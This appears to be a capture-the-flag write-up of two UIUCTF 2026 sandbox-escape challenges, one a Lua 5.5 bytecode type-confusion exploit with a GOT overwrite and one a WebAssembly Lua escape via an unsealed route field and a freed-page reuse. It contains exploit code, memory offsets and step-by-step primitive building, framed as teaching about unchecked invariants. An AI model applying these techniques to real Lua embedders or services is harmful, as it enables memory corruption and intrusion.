**UIUCTF 2026** ’s Binary Exploitation track is two Hard-difficulty Lua sandbox escapes, and they teach the same lesson from opposite ends of the stack. Firefly: Complete Combustion runs stock Lua 5.5.0 as a native x86-64 process, accepts precompiled bytecode only, and removes every source-loading primitive — but the stock `luai_verifycode` hook is empty, so an attacker can compile a program with the challenge’s own `luac` and then edit individual instructions. Sparxie: Vanishing Encore runs its moderation client as a WebAssembly module under Emscripten, accepts a Lua source cartridge wrapped in an SPX2 container, and hands off to custom native objects for permits, studios, clips, timelines, drafts, and queues — every one of which validates its own inputs. In both cases the intended path is not a stack overflow, a format string, or an integer bug. It is a **mismatch between what the integrity layer covers and what the runtime assumes**.

Firefly’s `OP_FORLOOP` reads `R[A]` and `R[A+2]` without checking their tags and updates them via `chgivalue`, which mutates the _payload_ but preserves the _tag_. Three malformed FORLOOP instructions turn a long string into an arbitrary-address `TString` view, a real table into an arbitrary-write `Table`, and the light C function `print` into the still-linked-but-removed `loadfile`. Redirecting `fclose@GOT` to libc’s `fflush` under partial RELRO keeps the `/flag.txt` stdio buffer alive after Lua’s parser rejects the flag as invalid source, and a groomed heap scan with `uiuctf%b{}` extracts the flag. Sparxie’s archive Spotlight Pass BLAKE2s seal covers `header[8:16] || body[0:28]` but **does not cover the 16-byte route field** — so the same archive pass converts into a valid relay permit with a forged route. Combined with a duplicate-clip relocation that leaves one clip pointing at a freed studio page (immediately reused by the queue), it grants a full lens over the static draft-object pool, a Lua-implemented BLAKE2s witness forgery, and a call into the WebAssembly host’s `sparxie_redeem` — which prints the flag.

Handouts, exploit scripts, ready-to-send payloads, and dependency-conscious solvers live at [Abdelkad3r/UIUCTF-2026](https://github.com/Abdelkad3r/UIUCTF-2026). This **CyberSecurity Elite** UIUCTF 2026 Binary Exploitation writeup covers both challenges end to end, with an emphasis on the _unchecked invariant_ that each exploit exploits and on the _primitive-building_ techniques (payload-arithmetic type confusion, freed-page reuse, GOT redirection for stdio-buffer retention, Lua-in-Lua BLAKE2s) that turn the initial primitive into a flag read.

## Both Binary Exploitation challenges at a glance#

Challenge| Points| Runtime| Unchecked invariant| Primitive chain| Flag  
---|---|---|---|---|---  
Firefly: Complete Combustion| 152| Native Lua 5.5.0 (x86-64 PIE, NX + canary + partial RELRO)| `luai_verifycode` is stubbed → bytecode passes `luaL_loadbufferx` even if it violates register-type assumptions| Three patched `FORLOOP`s → fake `TString` (read) + fake `Table` (write) + retarget `print` → `loadfile`. `fclose@GOT` → `fflush` keeps `/flag.txt` stdio buffer alive| `uiuctf{1_sh4ll_s3t_th3_s34s_4bl4z3}`  
Sparxie: Vanishing Encore| 201| WebAssembly (Emscripten) moderation client, custom `sparxie` module| Archive-pass BLAKE2s seal covers `header[8:16]| | body[0:28]`— **not** the 16-byte route field; timeline groups clips by`(studio, offset, length)` — **not** identity  
  
Two challenges, two different runtimes (native and WebAssembly), one shared root cause: **the trust boundary is drawn around the wrong artifact**. Firefly trusts a validly serialized bytecode chunk without checking register-type invariants; Sparxie trusts a BLAKE2s seal that does not cover the field the router reads. In both cases the exploit fits into the exact gap between what is checked and what the runtime assumes.

## Firefly: Complete Combustion — payload-arithmetic type confusion in Lua 5.5 bytecode#

> _Flag:_ `uiuctf{1_sh4ll_s3t_th3_s34s_4bl4z3}`
> 
> _Author’s hint:_ “Elio’s script never accounted for untrusted bytecode.”

Firefly runs stock Lua 5.5.0 inside a small x86-64 PIE. Each TLS connection accepts one length-prefixed binary Lua chunk. The wrapper opens the base, coroutine, table, string, math, and UTF-8 libraries; then it removes `dofile`, `load`, and `loadfile` from the globals. Nothing about the wrapper is exploitable — the entire attack surface is the bytecode loader itself.

### Audit the wrapper#

The service protocol is explicit in `main.c`:

```
    chunk_length = ((uint32_t)encoded_length[0] << 24) |
                   ((uint32_t)encoded_length[1] << 16) |
                   ((uint32_t)encoded_length[2] << 8) |
                   (uint32_t)encoded_length[3];
    if (chunk_length < 4 || chunk_length > MAX_CHUNK_SIZE)
      return EXIT_FAILURE;
```

It verifies the Lua signature and forces binary-only loading:

```
    if (memcmp(chunk, LUA_SIGNATURE, sizeof(LUA_SIGNATURE) - 1) != 0)
      return EXIT_FAILURE;
    
    status = luaL_loadbufferx(L, (const char *)chunk, chunk_length,
                              "@complete-combustion", "b");
```

Then it removes the source-loading globals:

```
    remove_global(L, "dofile");
    remove_global(L, "load");
    remove_global(L, "loadfile");
```

Binary properties: stripped x86-64 PIE, NX, stack canary, **partial RELRO** — `.got.plt` is writable, which becomes the entire endgame once we have arbitrary write.

### The missing verifier#

Lua’s binary chunk loader (`lundump.c`) checks the chunk signature, Lua version, format, instruction sizes, and serialized object bounds. It does _not_ verify that the loaded instruction stream obeys the register-type assumptions the VM makes at runtime. The verification hook is empty unless the embedder redefines it:

```
    #if !defined(luai_verifycode)
    #define luai_verifycode(L,f)  /* empty */
    #endif
```

The wrapper uses the stock implementation. So the pipeline is: compile a valid Lua program with the provided `luac`, patch individual instructions, and hand the result back. The loader accepts it because the _serialization_ is still structurally valid; the loader has no opinion about _semantics_.

### The `OP_FORLOOP` primitive#

Lua values are a payload plus a separate one-byte type tag:

```
    typedef union Value {
      struct GCObject *gc;
      void *p;
      lua_CFunction f;
      lua_Integer i;
      lua_Number n;
    } Value;
    
    typedef struct TValue {
      Value value_;
      lu_byte tt_;
    } TValue;
```

The integer path in Lua 5.5.0’s `OP_FORLOOP` handler:

```
    StkId ra = RA(i);
    if (ttisinteger(s2v(ra + 1))) {
      lua_Unsigned count = l_castS2U(ivalue(s2v(ra)));
      if (count > 0) {
        lua_Integer step = ivalue(s2v(ra + 1));
        lua_Integer idx = ivalue(s2v(ra + 2));
        chgivalue(s2v(ra), l_castU2S(count - 1));
        idx = intop(+, idx, step);
        chgivalue(s2v(ra + 2), idx);
        pc -= GETARG_Bx(i);
      }
    }
```

Two properties of this handler are the exploit:

  1. **Only`R[A+1]` (the step) is type-checked.** `R[A]` and `R[A+2]` are read through the integer union member without checking their tags.
  2. **`chgivalue` mutates the payload but preserves the tag.** So after the loop, `R[A+2]` still identifies as its original type but its payload is `original + step`.


The exploit therefore arranges three consecutive registers:

Register| Role| Value  
---|---|---  
`R[A]`| loop count| integer `1`  
`R[A+1]`| step| signed pointer delta  
`R[A+2]`| control| string, table, or light C function  
  
A forged `FORLOOP A 0` executes exactly one update (count decrements from 1 to 0 and the loop terminates), adds the delta to the raw payload of `R[A+2]`, preserves its original tag, and performs no backward jump (`Bx = 0`).

### Patching bytecode#

The readable Lua source uses `count = 2` as a marker instruction:

```
    local count = 1
    local step = chosen_delta
    local forged = original_value
    count = 2                  -- patched to FORLOOP A, 0
```

After compilation, [`build_exploit.py`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/firefly-complete-combustion/build_exploit.py) replaces each `LOADI A, 2` marker with a `FORLOOP A, 0`. Lua 5.5 instructions encode as:

```
    instruction = opcode | (A << 7) | (Bx << 15)
    opcodes: OP_LOADI = 1, OP_FORLOOP = 73
```

The patcher finds exactly three markers, preserves the compiler’s register allocation for everything else, and prepends the required 4-byte big-endian network length.

### Malformed loop 1 — fake `TString` for arbitrary read#

A regular long string’s x86-64 layout:

Offset| Field| Size  
---|---|---  
`0x00`| `next`| 8  
`0x08`| `tt / marked / extra / shrlen`| 4  
`0x0c`| `hash`| 4  
`0x10`| `lnglen`| 8  
`0x18`| `contents`| 8  
`0x20`| inline contents| variable  
  
Create a real long string whose first 32 inline bytes are a fake `TString` header:

```
    local header = string.pack(
      "<JBBBBI4TJ",
      0,          -- next
      20,         -- LUA_VLNGSTR
      0,          -- marked
      0,          -- extra
      0xff,       -- shrlen = LSTRREG (-1)
      0,          -- hash
      length,
      address
    ) .. string.rep("A", 64)
```

Then patch a FORLOOP that adds `32` to the real string-object pointer. The tag remains “long string” but the pointer now addresses the fake header at offset `0x20`:

```
    local count = 1
    local step = 32
    local forged = header
    count = 2                  -- patched to FORLOOP A, 0
    return forged
```

String consumers now trust the fake `lnglen` and `contents`. `string.unpack("<J", read_memory(address, 8))` reads any qword. GC is stopped at the beginning of the exploit so the collector does not try to traverse forged collectable objects.

### Leak PIE and libc#

Lua 5.5’s `string.format("%p", ...)` returns the raw pointer for a light C function via `lua_topointer`. That leaks `luaB_print` directly:

```
    local print_address = pointer(print)
    local pie_base = print_address - 0x25ad0
```

Once arbitrary read works, the resolved `puts` GOT entry leaks libc. `puts` has already run to print the banner:

```
    local puts_address = string.unpack("<J", read_memory(pie_base + 0x3c038, 8))
    local libc_base = puts_address - 0x87cc0
```

Relevant offsets in the shipped libc:

```
    puts@GOT       PIE  + 0x3c038
    puts           libc + 0x87cc0
    fclose@GOT     PIE  + 0x3c068
    fflush         libc + 0x858d0
```

### Malformed loop 2 — fake `Table` for arbitrary write#

Lua 5.5’s `Table` header:

Offset| Field  
---|---  
`0x00`| `next`  
`0x08`| `tt / marked / flags / lsizenode`  
`0x0c`| `asize`  
`0x10`| `array`  
`0x18`| `node`  
`0x20`| `metatable`  
`0x28`| `gclist`  
  
Array values are stored _before_ the `array` pointer, tags _after_ it. For zero-based index `u`:

```
    #define getArrVal(t,k) ((t)->array - 1 - (k))
```

For Lua key `46` (`u = 45`), setting `fake_table.array = target_address + 46 * 8` makes `fake_table[46] = value` write eight bytes at `target_address`. The tag byte lands at `target_address + 417` — the exploit routes that to an unused byte in `.bss`.

The second FORLOOP redirects a real table pointer to the fake table header:

```
    local seed = {}
    local count = 1
    local step = pointer(header) + 32 - pointer(seed)
    local forged = seed
    count = 2                  -- patched to FORLOOP A, 0
    forged[46] = value
```

Now we have arbitrary 8-byte write anywhere in writable memory.

### Malformed loop 3 — retarget `print` to hidden `loadfile`#

Base-library functions with no upvalues are stored as **light C functions** — the Lua value contains the actual function address, not a heap closure. So `print`’s value literally holds `luaB_print`. Removing the global `loadfile` does not remove its function body from the binary because `luaopen_base` referenced it while constructing the base library.

The offsets:

```
    luaB_print     PIE + 0x25ad0
    luaB_loadfile  PIE + 0x26680
    delta                0x00bb0
```

Third malformed loop:

```
    local count = 1
    local step = 0xbb0
    local target = print
    count = 2                  -- patched to FORLOOP A, 0
    
    target("/flag.txt")        -- actually luaB_loadfile("/flag.txt")
```

A diagnostic version of this stage returned:

```
    /flag.txt:1: malformed number near '1_'
```

That proved the hidden loader was reached, and leaked the first characters `uiuctf{1_` — but it did not leak the full flag because a flag is not valid Lua source. To recover the raw bytes we need to keep the file’s read buffer alive after the parser rejects it.

### Keep `/flag.txt` alive across the parser rejection#

`luaL_loadfilex` closes the `FILE *` even on parse failure:

```
    status = lua_load(L, getF, &lf, lua_tostring(L, -1), mode);
    readstatus = ferror(lf.f);
    if (filename) fclose(lf.f);
```

`fclose` frees or reuses the stdio buffer, destroying the bytes we need. Because the binary is partial RELRO, we redirect `fclose@GOT` to libc’s `fflush` before calling the hidden loader:

```
    write_memory(pie_base + 0x3c068, libc_base + 0x858d0)
    target("/flag.txt")
```

The call site still passes the `FILE *` in the correct first-argument register. `fflush(FILE *)` returns without closing or freeing, so the buffer stays in the heap.

### Heap grooming and flag extraction#

Allocate a predictable heap window and let the stdio allocation land in it:

```
    local heap_anchor = string.rep("H", 64)
    local heap_address = pointer(heap_anchor)
    local heap_padding = {}
    for index = 1, 39 do
      heap_padding[index] = string.rep("P", 65536)
    end
    local heap_window = read_memory(heap_address, 0x280000)
```

`heap_window` is not a copy — it is the fake `TString` view, so a subsequent read observes the _current_ heap contents. Extract the flag with Lua’s balanced-pattern operator:

```
    local trailing_mapping = string.rep("T", 65536)
    local flag = string.match(heap_window, "uiuctf%b{}")
    assert(flag, "flag was not found in the retained file buffer")
    print(flag)
```

The final compiled chunk is about 1.5 KiB — well under the 64 KiB input limit.

### Run#

Build the payload (Linux x86-64 or Docker):

```
    ./handout/ld-linux-x86-64.so.2 --library-path ./handout \
      ./handout/luac -o exploit.luac exploit.lua
    python3 build_exploit.py
```

Send it:

```
    python3 solve.py
```

Successful remote run:

```
          FYREFLY TYPE-IV // COMPLETE COMBUSTION
      GLAMOTH IRON CAVALRY // LUA 5.5.0
      Elio's script is not the one loaded today.
    send 4-byte big-endian length + Lua chunk:
    uiuctf{1_sh4ll_s3t_th3_s34s_4bl4z3}
    combat script complete
```

### Takeaway#

**A checked serialization is not a checked program.** Lua’s binary loader validates _structure_ , not _runtime type invariants_. The empty-stub `luai_verifycode` documents this explicitly — embedders that care are supposed to define it, and this one didn’t. Once that gap exists, `OP_FORLOOP`’s untyped read of `R[A]` and `R[A+2]` plus `chgivalue`’s tag-preserving payload update give payload-arithmetic type confusion in three lines of Lua per primitive. The GOT trick (`fclose → fflush`) is a small technique with an outsized effect: without it the flag file is opened, read into a heap buffer, and freed before the exploit can look, and the whole read chain is wasted. With it, the flag survives long enough for one final `string.match`.

## Sparxie: Vanishing Encore — WebAssembly freed-page reuse into BLAKE2s forgery#

> _Flag:_ `uiuctf{c0m3_w17h_5p4rx13_71ll_7h3_3nd_0f_7h3_w0rld}`
> 
> _Author’s hint:_ “Her production moderation client accepts creator cartridges.”

Sparxie runs an Emscripten WebAssembly module (`sparxicle.wasm`) under Node.js. Each connection accepts one SPX2 cartridge containing encrypted Lua source. The Lua sandbox is aggressive — `dofile / load / loadfile / print / tostring / string.format` all removed — but the custom `sparxie` native module exposes several manually managed objects (permits, studios, clips, timelines, drafts, queues, lenses). Two of those objects have logic bugs that compose into a full escape to the WASM host’s `sparxie_redeem` import, which reads and prints `/flag.txt`.

### The SPX2 cartridge and the sandbox#

`main.c` reads a 32-byte header. If the magic is `SPX2LIVE`, it reads the length word at offset 8 and decrypts the payload:

Offset| Size| Meaning  
---|---|---  
`0x00`| 8| `SPX2LIVE`  
`0x08`| 4| plaintext length  
`0x0c`| 4| nonce  
`0x10`| 4| plaintext checksum  
`0x14`| 4| header tag  
`0x18`| 4| lane count (`4`)  
`0x1c`| 4| encore tag  
`0x20`| variable| encrypted Lua source  
  
The supplied `pack.py` produces a valid cartridge from any Lua source. No attack on the cartridge format is needed.

The unpacked chunk is loaded in text-only mode:

```
    status = luaL_loadbufferx(state, (const char *)chunk, chunk_len,
                              "@vanishing-encore", "t");
```

The sandbox opens base, coroutine, table, string, math, UTF-8; removes `dofile`, `load`, `loadfile`, `print`, `tostring`, `string.format`; and installs the custom `sparxie` module and a hidden authority object.

### The flag target#

The JavaScript host provides `sparxie_redeem`:

```
    function _sparxie_redeem(noncePtr, nonceLen) {
      if (nonceLen !== 32)
        throw new Error("invalid backstage witness");
    
      const nonce = HEAPU8.slice(noncePtr, noncePtr + nonceLen);
      let flag = null;
      try {
        flag = require("fs").readFileSync("/flag.txt", "utf8").trim();
      } catch (_) {}
      if (!flag)
        throw new Error("backstage flag is unavailable");
    
      out("[Sparxie] The final encore reached backstage.");
      out(flag);
    }
```

There is no need to escape Lua or WASM. The exploit only needs to satisfy the native checks in `draft:publish()` — which eventually calls this import with a 32-byte witness.

### The Spotlight Pass and the coverage gap#

The supplied `spotlight.pass` is 92 bytes:

Offset| Size| Meaning  
---|---|---  
`0x00`| 8| `SPXPASS!`  
`0x08`| 4| catalogue ID  
`0x0c`| 4| body length `28`  
`0x10`| 16| route  
`0x20`| 28| body  
`0x3c`| 32| BLAKE2s seal  
  
The original route is the archive route (`0x11` followed by 15 zero bytes). `spotlight_review()` accepts this as catalogue data — but the archive path returns the Lua boolean `true`, which cannot be handed to `studio:render()`. Only the _relay_ path returns a native `Permit` userdata.

The archive seal is:

```
    BLAKE2s(
        "SPARXIE::CATALOGUE::ARCHIVE" ||
        header[8:16] ||
        body[0:28]
    )
```

**The 16-byte route field at`header[16:32]` is absent from the seal.** The original body and supplied seal can therefore remain unchanged while the route is replaced.

### Forge the relay route#

The relay route has its own truncated authenticator:

```
    BLAKE2s(
        "SPARXIE::CATALOGUE::RELAY" ||
        seal ||
        header[8:16] ||
        route[0:2] ||
        route[8:12]
    )
```

`route_valid()` compares only digest bytes `0:6` with `route[2:8]` and digest bytes `8:12` with `route[12:16]`. All inputs to that BLAKE2s are non-secret — the exploit can compute the digest offline and produce a matching route.

Set the type and edition:

```
    route[0] = 0x27    # relay
    route[1] = 0x05    # required edition
```

The relay migration prepends `route[8:16]` to the original 28-byte body and decodes with `string.unpack` schema `<!1s8I4I4I8`. The first field is an 8-byte length prefix. Set its low 32 bits to `12` via `route[8:12] = 0c 00 00 00`. The high 32 bits must hold relay digest bytes `8:12` — but the WASM target uses a 32-bit `size_t`, so Lua’s `s8` decoder truncates and extracts exactly 12 body bytes.

For the supplied seal, the relay digest is:

```
    b9893afab0eda92da20585c314d7a686fc47cdb85e3b350eb88bcdd04e155af0
```

Producing the replacement route:

```
    27 05 b9 89 3a fa b0 ed 0c 00 00 00 a2 05 85 c3
```

Decoded policy:

```
    byte string length = 12
    operation          = 0x6b13c4a9
    quota              = 47
    edition            = 0x5a31c89e72d40b6f
```

Its BLAKE2s policy digest matches the hard-coded `allowed_policy`. `sparxie.review(modified_pass)` returns a valid one-use permit. The modified 92-byte pass is embedded at the beginning of `exploit.lua`.

### The custom Lua API#

Decompiling `sparxicle.wasm` and following `luaL_Reg` registration arrays recovers:

Constructor / method| Effect  
---|---  
`sparxie.review(pass)`| validates a pass, returns a permit  
`sparxie.studio()`| creates a studio backed by a 4096-byte page  
`studio:clip(offset, length)`| clip view into the page  
`sparxie.timeline({clips})`| validates and groups clips  
`sparxie.draft()`| creates a protected draft record  
`studio:render(timeline, permit)`| consumes the permit, relocates the studio page  
`sparxie.queue(draft)`| creates a queue  
`queue:lens()`| returns a checked 16 KiB read/write lens  
`lens:read / lens:write`| access the lens backing pointer  
`draft:publish()`| validates the draft, calls `sparxie_redeem`  
  
Expected happy path:

```
    local permit = sparxie.review(pass)
    local studio = sparxie.studio()
    local clip = studio:clip(0, 1)
    local timeline = sparxie.timeline({clip})
    local draft = sparxie.draft()
    studio:render(timeline, permit)
    local queue = sparxie.queue(draft)
    local lens = queue:lens()
    draft:publish()
```

The remaining task: change the protected draft _without_ invalidating its userdata cookie.

### The shared page pool#

Studios and queues draw from the same static free list at WASM linear-memory offset `0x7650`; each entry is 4104 bytes (4096 usable + allocator metadata).

Studio and clip structures:

```
    struct Studio {
        uint8_t *page;
        uint32_t clip_count;
        uint32_t generation;
    };
    
    struct Clip {
        Studio *owner;
        uint8_t *data;
        uint32_t offset;
        uint32_t length;
        uint32_t generation;
        uint32_t active;
    };
```

During `studio:render()`, the client allocates a new page, copies all 4096 bytes, updates the studio pointer and generation, **repairs the timeline’s clip records** , and returns the old page to the head of the shared free list. A subsequent `sparxie.queue(draft)` allocation deterministically reuses that page.

### The duplicate-clip relocation bug#

Timeline construction correctly rejects the same clip userdata appearing twice. It does **not** reject two _distinct_ clip objects with identical `(offset, length)`. The relocation bookkeeping groups clips by:

```
    (studio owner, offset, length)
```

Only one representative pointer is stored per group. Render walks those groups rather than every original clip userdata — so two separate clips for `(0, 4096)` become one relocation entry, and only one receives the new page pointer:

```
    local first = studio:clip(0, 4096)
    local second = studio:clip(0, 4096)
    local timeline = sparxie.timeline({second, first})
    studio:render(timeline, permit)
```

After render:

  * one clip points to the new studio page;
  * **one clip still points to the freed page** ;
  * the next `sparxie.queue(draft)` allocation reuses that freed page.


The exploit does not depend on which clip became the representative — it writes through both. One write corrupts an unused new studio page, the other reaches the live queue metadata.

### Redirect the queue lens to the static draft pool#

The queue page holds 63 records, each 64 bytes:

Slot-relative offset| Size| Meaning  
---|---|---  
`+0x08`| 4| slot identity  
`+0x0c`| 4| slot cookie  
`+0x10`| 4| 16 KiB backing pointer  
`+0x14`| 4| backing size (`0x4000`)  
  
`queue:lens()` picks one of the 63 via randomized state. Rather than predict the index, rewrite the pointer in every record:

```
    for i = 0, 62 do
        local slot_pointer = i * 64 + 16
        first:write(slot_pointer, "\x20\xf7\x01\x00")
        second:write(slot_pointer, "\x20\xf7\x01\x00")
    end
```

`20 f7 01 00` is `0x1f720`, the start of the static 272-byte-per-record **draft-object pool**. It is 8-byte aligned and inside the lens validator’s accepted range. Slot identities, cookies, and declared sizes are untouched. The resulting `lens` provides a legitimate bounded read/write over 16 KiB of static memory — enough to cover the entire draft pool and the installed authority record.

### Find live draft and authority by marker#

Queue construction fills unused draft entries with decoys. The 32-bit markers at record offset `+260`:

Object| Marker| Little-endian  
---|---|---  
live draft| `0x31d8a6f2`| `f2 a6 d8 31`  
authority| `0x9e51c7a3`| `a3 c7 51 9e`  
decoy draft| `0x74b29c15`| `15 9c b2 74`

```
    local pool = lens:read(0, 16384)
    local draft_marker = string.find(pool, "\xf2\xa6\xd8\x31", 1, true)
    local target = draft_marker - 1 - 260
    
    local authority_marker = string.find(pool, "\xa3\xc7\x51\x9e", 1, true)
    local authority = authority_marker - 1 - 260
```  
  
### Fields required by `draft:publish()`#

Draft-relative offset| Size| Required  
---|---|---  
`+0x40`| 32| runtime BLAKE2s witness  
`+0x60`| 8| campaign `0x5a31c89e72d40b6f`  
`+0x68`| 4| operation `0xb74e25c1`  
`+0x6c`| 4| receipt already in userdata  
`+0x104`| 4| draft marker `0x31d8a6f2`  
  
Writing through the record rather than forging the Lua userdata preserves the pointer-dependent userdata cookie.

### Reproduce the runtime witness in Lua#

The exact BLAKE2s input for the witness:

```
    "SPARXIE::ENCORE::PROOF"       (22 bytes)
    || authority[0:32]
    || draft[0:64]
    || catalogue_seal              (32 bytes)
    || campaign                    (8 bytes, little-endian)
    || operation                   (4 bytes, little-endian)
    || receipt                     (4 bytes, little-endian)
```

The catalogue seal is constant and already present in the modified pass:

```
    c4dab9e27f93ba5c9ff1432230dcfb6871f33b31896065f7aaf435c44225cd98
```

Because the `string` library retains `pack`, `unpack`, `sub`, and `rep`, a compact BLAKE2s implementation runs entirely inside the Lua cartridge. Read the randomized values, compute the digest, do the three writes:

```
    lens:write(target + 64, blake2s(proof))
    lens:write(target + 96, campaign)
    lens:write(target + 104, operation)
    draft:publish()
```

`publish()` recomputes the same witness, accepts the record, and calls `sparxie_redeem()`. `/flag.txt` is printed.

### Exploit flow (recap)#

  1. Embed the archive pass with its forged relay route.
  2. `sparxie.review()` returns a real permit.
  3. Allocate two distinct `(0, 4096)` clips.
  4. `render()` leaves one stale clip pointing at the freed page.
  5. `sparxie.queue(draft)` allocates on that page.
  6. Rewrite all 63 queue-slot pointers to `0x1f720` through both clips.
  7. `queue:lens()` returns a lens over the static draft pool.
  8. Locate the live draft and authority by their 4-byte markers.
  9. Compute the runtime BLAKE2s witness in Lua.
  10. Write proof / campaign / operation.
  11. `draft:publish()` → `sparxie_redeem()` → flag.


Source is 4968 bytes; the packed cartridge is 5000 bytes — comfortably under both service limits.

### Takeaway#

**A BLAKE2s seal is only as good as the bytes it covers.** The archive seal covers 8 bytes of the header and 28 bytes of the body — but not the 16-byte route field the router will read. Once that gap exists, an archive pass converts into a relay permit without touching the seal at all. The duplicate-clip UAF is the other half: the timeline check dedupes clip _identity_ but not `(owner, offset, length)`, and the relocation walks the grouped set — so one clip’s page pointer never gets updated, and the deterministic page reuse hands that clip a lens on live queue metadata. Both bugs are logic bugs disguised as engineering; both are invisible if you only read the _check_ and not the _invariant that the check is supposed to establish_.

## Cross-cutting lessons from the UIUCTF 2026 Binary Exploitation set#

Two challenges, two languages (native Lua, WebAssembly Lua), one repeated pattern — **the exploit lives in the gap between what is checked and what the runtime assumes** :

  * **Firefly** checks that the bytecode chunk is _serially valid_ ; the VM assumes register-type invariants that the loader does not enforce. `OP_FORLOOP` reads `R[A+2]` without a tag check and updates it via `chgivalue`, which preserves the tag while changing the payload. That gap is the whole exploit.
  * **Sparxie** checks that the Spotlight Pass has a valid BLAKE2s seal — over 36 bytes that do not include the 16-byte route. The relay router assumes the route is authenticated. And separately, the timeline dedupes clip userdata identity but not `(owner, offset, length)`, so freed-page reuse is one line of Lua away.


Portable techniques from the set:

  * **Compile with the shipped compiler; patch after.** Firefly’s `luaL_loadbufferx` accepts any structurally valid bytecode. Producing that bytecode with `luac`, then rewriting individual opcodes, is far cheaper than assembling a Lua binary chunk by hand. The one-instruction change per primitive keeps the compiler’s register allocation intact.
  * **Payload arithmetic + tag preservation = type confusion.** Any VM primitive that computes on a value’s payload while leaving its tag alone is a type-confusion tool. `chgivalue` in Lua 5.5 is the textbook example; equivalents exist in other VMs (V8’s Smi/HeapObject tag preservation, CPython’s tagged pointer arithmetic in some optimization tiers).
  * **Partial RELRO is a stdio-lifetime primitive.** `fclose@GOT → fflush` is the least dramatic-looking one-write exploit possible, and it is exactly enough to keep `/flag.txt`’s buffer alive after the parser rejects it. Any binary shipping partial RELRO plus one arbitrary write should be looked at through this lens.
  * **Light C functions leak PIE for free.** Base-library functions with no upvalues store the raw function address in their Lua value. `string.format("%p", print)` (or in Firefly, `tostring(print):match("0x%x+")` since `%p` is available) is a one-line PIE leak — no info-leak bug required.
  * **Seal your metadata, not just your payload.** Sparxie’s archive seal skipping the route field is the same pattern as Zip-Slip’s local-file-inclusion, JWT’s `alg:none`, and any signed-envelope format that omits any header that later routes the message. If a byte can change the destination and it is not covered by the signature, it will change the destination.
  * **Dedupe by identity, not by tuple.** Sparxie’s timeline groups clips by `(owner, offset, length)` because the intent was to relocate identical ranges once. But the sandbox only guaranteed that no clip userdata appeared twice — an attacker-controlled _distinct_ userdata with the same tuple slips right through. If a check needs to enforce uniqueness of some _thing_ , dedupe on the identity of the thing, not on its coordinates.
  * **Freed-page reuse is a targeted primitive when the allocator is deterministic.** Sparxie’s shared free list guarantees that the queue allocation reuses the page just freed by `render()`. Any allocator that does LIFO on a static free list turns “free” into “hand the attacker a chosen typed view.”
  * **You can put crypto inside the sandbox.** Sparxie’s witness reproduction runs BLAKE2s entirely in Lua — because `string.pack`, `string.unpack`, `string.sub`, and `string.rep` are still available. Any sandbox that keeps enough of the string library to XOR and rotate can host any hash or block cipher.
